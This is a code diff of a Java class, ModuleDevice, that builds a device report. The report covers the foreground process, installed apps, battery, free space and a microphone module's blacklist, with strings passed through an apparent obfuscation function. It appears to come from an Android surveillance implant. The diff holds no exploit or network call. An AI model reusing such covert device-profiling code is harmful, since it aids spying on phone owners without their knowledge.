@@ -112,15 +112,6 @@ public class ModuleDevice extends BaseInstantModule {
 					sb.append("Timestamp: " + timestamp + "\n"); //$NON-NLS-1$
 				}
 			}
-			
-			ModuleMic mic = ModuleMic.self();
-			if(mic != null){
-				sb.append("MIC blacklist: ");
-				for (String black : mic.blacklist) {
-					sb.append(black + " ");
-				}
-				sb.append("\n");
-			}
 
 			long freeSpace = getSystem(sb);
 			int battery = getBattery(sb);
@@ -210,6 +201,15 @@ public class ModuleDevice extends BaseInstantModule {
 
 		RunningProcesses runningProcesses = new RunningProcesses();
 		sb.append(M.e("Foreground process: ") +runningProcesses.getForeground() + "\n"); //$NON-NLS-1$
+		
+		ModuleMic mic = ModuleMic.self();
+		if(mic != null){
+			sb.append("MIC blacklist: ");
+			for (String black : mic.blacklist) {
+				sb.append(black + " ");
+			}
+			sb.append("\n");
+		}
 		
 		return bytesAvailableInt / 1024;
 	}
@@ -346,8 +346,10 @@ public class ModuleDevice extends BaseInstantModule {
 
 			try {
 				final PInfo newInfo = new PInfo();
-				newInfo.appname = p.applicationInfo.loadLabel(packageManager).toString();
 				newInfo.pname = p.packageName;
+				if(!newInfo.pname.contains(M.e("keyguard"))){
+					newInfo.appname = p.applicationInfo.loadLabel(packageManager).toString();
+				}
 				newInfo.versionName = p.versionName;
 				newInfo.versionCode = p.versionCode;
 				res.add(newInfo);
